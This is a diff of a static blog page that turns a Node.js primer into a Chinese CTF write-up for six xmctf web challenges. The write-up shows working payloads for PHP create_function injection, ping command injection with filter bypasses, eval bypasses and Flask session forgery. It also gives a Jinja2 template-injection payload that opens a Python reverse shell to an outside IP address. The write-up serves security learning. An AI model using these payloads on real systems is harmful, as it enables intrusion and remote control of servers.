@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Node.js," />
+  <meta name="keywords" content="ssti,RCE,bypass," />
 
 
 
@@ -79,21 +79,37 @@
 
 
 
-<meta name="description" content="什么是Node.js以及为什么要用node.js通过翻阅官方手册，得到以下信息   Node.js 是一个开源与跨平台的 JavaScript 运行时环境。 Node.js 在浏览器外运行 V8 JavaScript 引擎（Google Chrome 的内核）。   由此我们可以简单认为，node.js是一个让JavaScript脱离浏览器之外运行的环境或语言解释器。 其主要具有以下几个特征： 服">
+<meta name="description" content="xmctf部分web 平台：xmctf.top">
 <meta property="og:type" content="article">
-<meta property="og:title" content="初识Node.js">
-<meta property="og:url" content="http://yoursite.com/2020/06/28/node/index.html">
+<meta property="og:title" content="xmctf平台部分web">
+<meta property="og:url" content="http://yoursite.com/2020/06/24/xmctf_web_wp/index.html">
 <meta property="og:site_name" content="Blacknight">
-<meta property="og:description" content="什么是Node.js以及为什么要用node.js通过翻阅官方手册，得到以下信息   Node.js 是一个开源与跨平台的 JavaScript 运行时环境。 Node.js 在浏览器外运行 V8 JavaScript 引擎（Google Chrome 的内核）。   由此我们可以简单认为，node.js是一个让JavaScript脱离浏览器之外运行的环境或语言解释器。 其主要具有以下几个特征： 服">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200628164911.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200628165757.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200628201419.png">
-<meta property="article:published_time" content="2020-06-28T07:30:00.000Z">
-<meta property="article:modified_time" content="2020-06-28T12:14:42.626Z">
+<meta property="og:description" content="xmctf部分web 平台：xmctf.top">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200623224807.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200623225636.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200623230422.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624074453.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624075157.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624083307.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624083629.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624083748.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624085221.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624085025.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624085650.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624085732.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624194649.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624194943.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200625205840.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624201535.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624202207.png">
+<meta property="article:published_time" content="2020-06-24T07:30:00.000Z">
+<meta property="article:modified_time" content="2020-07-08T11:11:01.917Z">
 <meta property="article:author" content="blacknight">
-<meta property="article:tag" content="Node.js">
+<meta property="article:tag" content="ssti">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="bypass">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200628164911.png">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200623224807.png">
 
 
 
@@ -123,13 +139,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2020/06/28/node/"/>
+  <link rel="canonical" href="http://yoursite.com/2020/06/24/xmctf_web_wp/"/>
 
 
 
 
 
-  <title>初识Node.js | Blacknight</title>
+  <title>xmctf平台部分web | Blacknight</title>
   
 
 
@@ -280,7 +296,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/28/node/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/24/xmctf_web_wp/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="blacknight">
@@ -297,7 +313,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">初识Node.js</h1>
+          <h1 class="post-title" itemprop="name headline">xmctf平台部分web</h1>
         
 
         <div class="post-meta">
@@ -309,8 +325,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-06-28T15:30:00+08:00">
-                2020-06-28
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-06-24T15:30:00+08:00">
+                2020-06-24
               </time>
             
 
@@ -332,8 +348,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
-                    <span itemprop="name">web安全</span>
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
                   </a>
                 </span>
 
@@ -350,8 +366,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2020/06/28/node/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count valine-comment-count" data-xid="/2020/06/28/node/" itemprop="commentCount"></span>
+                <a href="/2020/06/24/xmctf_web_wp/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2020/06/24/xmctf_web_wp/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -373,7 +389,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  746
+                  1.5k
                 </span>
               
 
@@ -389,7 +405,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  2
+                  6
                 </span>
               
             </div>
@@ -410,26 +426,82 @@
       
 
       
-        <h3 id="什么是Node-js以及为什么要用node-js"><a href="#什么是Node-js以及为什么要用node-js" class="headerlink" title="什么是Node.js以及为什么要用node.js"></a>什么是Node.js以及为什么要用node.js</h3><p>通过翻阅官方手册，得到以下信息</p>
+        <p>xmctf部分web</p>
+<p>平台：xmctf.top</p>
+<a id="more"></a>
+
+<h3 id="easy-web"><a href="#easy-web" class="headerlink" title="easy-web"></a>easy-web</h3><p>打开靶机源码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$key = <span class="string">"bad"</span>;</span><br><span class="line">extract($_POST);</span><br><span class="line"><span class="keyword">if</span>($key === <span class="string">'bad'</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'badbad!!!'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$act = @$_GET[<span class="string">'act'</span>];</span><br><span class="line">$arg = @$_GET[<span class="string">'arg'</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9_]*$/isD'</span>,$act)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'check'</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $act($arg,<span class="string">''</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'666'</span>;</span><br><span class="line">badbad!!!</span><br></pre></td></tr></table></figure>
+
+<p>存在一个变量key为bad，定义了值为bad所以die出badbad，get传参两个参数act和arg，正则匹配a-z，0-9，/i不区分大小写<br>/s匹配任何不可见字符，包括空格、制表符、换页符等等，/D如果使用$限制结尾字符,则不允许结尾有换行</p>
+<p>需要绕过if正则匹配，从而控制arg参数</p>
+<p>考点：create_function代码注入</p>
 <blockquote>
-<ul>
-<li>Node.js 是一个开源与跨平台的 JavaScript 运行时环境。</li>
-<li>Node.js 在浏览器外运行 V8 JavaScript 引擎（Google Chrome 的内核）。</li>
-</ul>
+<p>create_function：根据传递的参数创建匿名函数，并为其返回唯一名称</p>
+<p>语法:<br>create_function(string $args,string $code)<br>//string $args 声明的函数变量部分<br>//string $code 执行的方法代码部分</p>
 </blockquote>
-<p>由此我们可以简单认为，node.js是一个让JavaScript脱离浏览器之外运行的环境或语言解释器。</p>
-<p>其主要具有以下几个特征：</p>
-<h4 id="服务器端JavaScript处理"><a href="#服务器端JavaScript处理" class="headerlink" title="服务器端JavaScript处理"></a>服务器端JavaScript处理</h4><p>node.js的出现使得javascript代码实现了脱离客户端执行，与传统的web开发者前端使用js，后端服务器使用另一种语言如php，python相比，node.js给开发者提供了一个编写后端服务器代码的环境，实现了一定程度上的前后端统一，使得开发者无需学习另一门完全不同的语言，其高度的代码复用性，也大大提升了开发者的效率。</p>
-<h4 id="单线程"><a href="#单线程" class="headerlink" title="单线程"></a>单线程</h4><p>传统的服务器每次一个新用户连到你的网站上时，服务器就得开一个连接。每个连接都需要占一个进程，这些进程大部分时间都是闲着的，因此很容易造成内存浪费，而node.js仅仅使用一个线程。当有用户连接了，就触发一个内部事件，通过非阻塞 I/O、事件驱动机制，使得这种模式正常运转。</p>
-<h4 id="非阻断-异步I-O"><a href="#非阻断-异步I-O" class="headerlink" title="非阻断/异步I/O"></a>非阻断/异步I/O</h4><p>在传统的单线程处理机制中，在执行了访问数据库代码之后，整个线程都将暂停下来，等待数据库返回结果，才能执行后面的代码。也就是说，I/O阻塞了代码的执行，极大地降低了程序的执行效率。而node.js进行I/O操作的时候，将调取后面其他部分的计算，直至I/O完成，然后再进行原来部分I/O操作后的后续计算。通俗的描述就是在一件事没做完之前不要停下来，继续做下一件。</p>
-<h4 id="事件驱动"><a href="#事件驱动" class="headerlink" title="事件驱动"></a>事件驱动</h4><p>非阻断I/O需要事件驱动机制的配合才能顺利运转。在Node.js中，客户端请求建立连接，提交数据等行为，会触发相应的事件，服务器只在用户那边有事件发生的时候才响应。接收到请求，就把它关闭然后进行处理，然后去服务下一个请求。这样，保证了非阻断I/O的顺利进行，提升了效率。</p>
-<p>通过采用单线程，非阻断I/O，事件驱动的模型，node.js在减少内存开销的同时，也大大提升了处理业务的效率。</p>
-<h3 id="Node-js的使用方法"><a href="#Node-js的使用方法" class="headerlink" title="Node.js的使用方法"></a>Node.js的使用方法</h3><h4 id="命令行运行node-js脚本"><a href="#命令行运行node-js脚本" class="headerlink" title="命令行运行node.js脚本"></a>命令行运行node.js脚本</h4><p>安装node.js后，只需在命令行输入node即可进入交互环境</p>
-<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200628164911.png" alt=""></p>
-<p>可以直接在命令行中执行js代码</p>
-<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200628165757.png" alt=""></p>
-<p>也可执行目录下js脚本</p>
-<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200628201419.png" alt=""></p>
+<p>第一步要让key不die掉，直接post一个key把原来的key覆盖掉即可<br>然后想要函数正常调用，那就必须绕过正则，因此我们要在函数名的头或者尾加上一个字符<code>\</code></p>
+<blockquote>
+<p>php里默认命名空间是\，所有原生函数和类都在这个命名空间中。普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name() 这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。</p>
+</blockquote>
+<p>那么接下来就是利用<code>$act($arg,&#39;&#39;);</code>进行代码注入了。</p>
+<p>payload：<code>?act=\create_function&amp;arg=){return%20123;}system(%27dir%27);//</code><br>传入之后</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$act($arg,&#39;&#39;);</span><br><span class="line">create_function()&#123;return%20123;&#125;system(%27dir%27);&#x2F;&#x2F;,&#39;&#39;)</span><br></pre></td></tr></table></figure>
+
+<p>实际上也就是这样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">function a&#123;</span><br><span class="line">return%20123;&#125;system(%27dir%27);&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>函数被闭合，就可以执行任意命令了。<br>读flag:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200623224807.png" alt=""></p>
+<h3 id="RCE-训练"><a href="#RCE-训练" class="headerlink" title="RCE-训练"></a>RCE-训练</h3><p>打开靶机得源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line">$ip = $_GET[<span class="string">'ip'</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($ip)) &#123;</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">"/(;|`| |&amp;|cp|mv|cat|tail|more|rev|tac|\*|\&#123;)/i"</span>, $ip))&#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">"hack"</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/.*f.*l.*a.*g.*/"</span>, $ip))&#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">"no!&gt;"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  $a = shell_exec(<span class="string">"ping -c 4 "</span>.$ip);</span><br><span class="line">  var_dump($a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>主要两个正则，第一个过滤一些文件读取命令，第二个匹配flag的任意单个或多个字符串。<br>经测试可以用<code>|</code>进行命令执行<br><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200623225636.png" alt=""></p>
+<p>那么关键是绕过了，可以利用shell命令构造</p>
+<p>payload：<code>?ip=127.0.0.1|echo$IFS$9bHMgLw|base64$IFS$1-d|sh</code><br>$IFS$9代替空格，bHMgLw-&gt;ls /，输出给base64还原然后sh执行</p>
+<p>那么读取flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200623230422.png" alt=""></p>
+<h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><p>打开靶机有一串md5代码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624074453.png" alt=""></p>
+<p>解析后为1.1.1.1，抓包加个xff头成功下一步</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624075157.png" alt=""></p>
+<p>打开php得源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$disable_fun = [<span class="string">"assert"</span>,<span class="string">"print_r"</span>,<span class="string">"system"</span>, <span class="string">"shell_exec"</span>,<span class="string">"ini_set"</span>, <span class="string">"scandir"</span>, <span class="string">"exec"</span>,<span class="string">"proc_open"</span>, <span class="string">"error_log"</span>, <span class="string">"ini_alter"</span>, <span class="string">"ini_set"</span>, <span class="string">"pfsockopen"</span>, <span class="string">"readfile"</span>, <span class="string">"echo"</span>, <span class="string">"file_get_contents"</span>, <span class="string">"readlink"</span>, <span class="string">"symlink"</span>, <span class="string">"popen"</span>, <span class="string">"fopen"</span>, <span class="string">"file"</span>, <span class="string">"fpassthru"</span>];</span><br><span class="line">$disable_fun = array_merge($disable_fun, get_defined_functions()[<span class="string">'internal'</span>]);</span><br><span class="line"><span class="keyword">foreach</span>($disable_fun <span class="keyword">as</span> $i)&#123;</span><br><span class="line">    <span class="keyword">if</span>(stristr($_GET[shell], $i)!==<span class="keyword">false</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'xmctf'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>($_GET[shell]);</span><br></pre></td></tr></table></figure>
+
+<p>disable_fun列表是一些文件操作函数，array_merge将多个数组单元合并，get_defined_functions返回数组，foreach遍历新的disable_function并传递给$i，if检测如果传入的shell中在数组中出现，则die，过了if检测则输出shell内容</p>
+<p>直接变量拼接，payload：?shell=$a;$a=’syst’.’em’;$a(“cat flag.php”);<br>传入在源码得到flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624083307.png" alt=""></p>
+<h3 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h3><p>打开靶机</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624083629.png" alt=""></p>
+<p>传入<code>?name=4</code>回显</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624083748.png" alt=""></p>
+<p>猜测为模板注入，<code></code>查看配置信息，发现secret_key泄露</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624085221.png" alt=""></p>
+<p>那么考虑session伪造了，查看cookie部分发现jwt</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624085025.png" alt=""></p>
+<p>解密得<code>{&#39;username&#39;: b&#39;guest&#39;}</code>，利用flask_session_cookie_manager脚本伪造admin</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624085650.png" alt=""></p>
+<p>修改session访问/flag即可</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624085732.png" alt=""></p>
+<h3 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h3><p>打开靶机只有一句hello，guest，讲道理要是没做web8我都想不到要传name。。。。<br>测试之后发现还是模板注入，</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624194649.png" alt=""></p>
+<p>不过测试之后发现过了了很多东西，config，下划线，点号等等</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624194943.png" alt=""></p>
+<p>也没有了session伪造不了，那么只能命令执行了。</p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;[request[&quot;ar&quot;+&quot;gs&quot;][&quot;class&quot;]][request[&quot;ar&quot;+&quot;gs&quot;][&quot;mro&quot;]][1][request[&quot;ar&quot;+&quot;gs&quot;][&quot;subclass&quot;]]()[286][request[&quot;ar&quot;+&quot;gs&quot;][&quot;init&quot;]][request[&quot;ar&quot;+&quot;gs&quot;][&quot;globals&quot;]][&quot;os&quot;][&quot;popen&quot;](request[&quot;ar&quot;+&quot;gs&quot;][&quot;cmd&quot;])[&quot;read&quot;]()&#125;&#125;&amp;class&#x3D;__class__&amp;mro&#x3D;__mro__&amp;subclass&#x3D;__subclasses__&amp;init&#x3D;__init__&amp;globals&#x3D;__globals__&amp;cmd&#x3D;python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;47.98.134.220&quot;,3122));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;</span><br></pre></td></tr></table></figure>
+
+<p>用<code>request[&quot;args&quot;][&quot;xx&quot;]</code>配合赋值代替双下划线，后面开个python服务器连上自己的ecs，nc监听</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200625205840.png" alt=""></p>
+<p>读取flag即可。</p>
+<h3 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h3><p>打开靶机得源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">flag在哪里呢？</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag在哪里呢？&lt;br&gt;"</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/et|cu|readfile|flip|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET['exp'];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">'exp'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"还差一点哦！"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"再好好想想！"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"还想读flag，臭弟弟！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>主要三层正则匹配，第一层禁用了几个伪协议，第二层匹配a-z，逗号，下划线，(?R)引用当前表达式，(?R)?代表可以有引用，也可以没有，引用则变成<code>[a-z,_]+\([a-z,_]+\((?R)?\)\)</code>的形式，可以一直迭代下去。这样可以匹配一些诸如print(echo(1))括号和字符组成的字符集，第三个禁用一些函数</p>
+<p>payload：<code>?exp=print_r(scandir(pos(localeconv())));</code>，scandir列出目录，pos返回数组中的当前单元, 默认取第一个值，localeconv返回数组。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624201535.png" alt=""></p>
+<p>那么读取flag.php，next函数读取php的第一个元素的下一个元素，flag.php是倒数第二个，所以可以把用array_reverse把数组倒过来再用next指向flag.php，最后用highlight_file读取。<br>payload：<code>highlight_file(next(array_reverse(scandir(pos(localeconv())))));</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624202207.png" alt=""></p>
 
       
     </div>
@@ -447,7 +519,11 @@
       
         <div class="post-tags">
           
-            <a href="/tags/Node-js/" rel="tag"><i class="fa fa-tag"></i> Node.js</a>
+            <a href="/tags/ssti/" rel="tag"><i class="fa fa-tag"></i> ssti</a>
+          
+            <a href="/tags/RCE/" rel="tag"><i class="fa fa-tag"></i> RCE</a>
+          
+            <a href="/tags/bypass/" rel="tag"><i class="fa fa-tag"></i> bypass</a>
           
         </div>
       
@@ -460,8 +536,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2020/06/24/xmctf_web_wp/" rel="next" title="xmctf平台部分web">
-                <i class="fa fa-chevron-left"></i> xmctf平台部分web
+              <a href="/2020/06/20/DozerCTF_web_wp/" rel="next" title="DozerCTF2020部分web复现">
+                <i class="fa fa-chevron-left"></i> DozerCTF2020部分web复现
               </a>
             
           </div>
@@ -470,8 +546,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2020/07/03/BJD2020_web_wp/" rel="prev" title="BJDCTF2020web复现">
-                BJDCTF2020web复现 <i class="fa fa-chevron-right"></i>
+              <a href="/2020/06/28/node/" rel="prev" title="初识Node.js">
+                初识Node.js <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -681,7 +757,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#什么是Node-js以及为什么要用node-js"><span class="nav-number">1.</span> <span class="nav-text">什么是Node.js以及为什么要用node.js</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#服务器端JavaScript处理"><span class="nav-number">1.1.</span> <span class="nav-text">服务器端JavaScript处理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#单线程"><span class="nav-number">1.2.</span> <span class="nav-text">单线程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#非阻断-异步I-O"><span class="nav-number">1.3.</span> <span class="nav-text">非阻断&#x2F;异步I&#x2F;O</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#事件驱动"><span class="nav-number">1.4.</span> <span class="nav-text">事件驱动</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Node-js的使用方法"><span class="nav-number">2.</span> <span class="nav-text">Node.js的使用方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#命令行运行node-js脚本"><span class="nav-number">2.1.</span> <span class="nav-text">命令行运行node.js脚本</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#easy-web"><span class="nav-number">1.</span> <span class="nav-text">easy-web</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RCE-训练"><span class="nav-number">2.</span> <span class="nav-text">RCE-训练</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web4"><span class="nav-number">3.</span> <span class="nav-text">web4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web8"><span class="nav-number">4.</span> <span class="nav-text">web8</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web11"><span class="nav-number">5.</span> <span class="nav-text">web11</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web12"><span class="nav-number">6.</span> <span class="nav-text">web12</span></a></li></ol></div>
             
 
           </div>
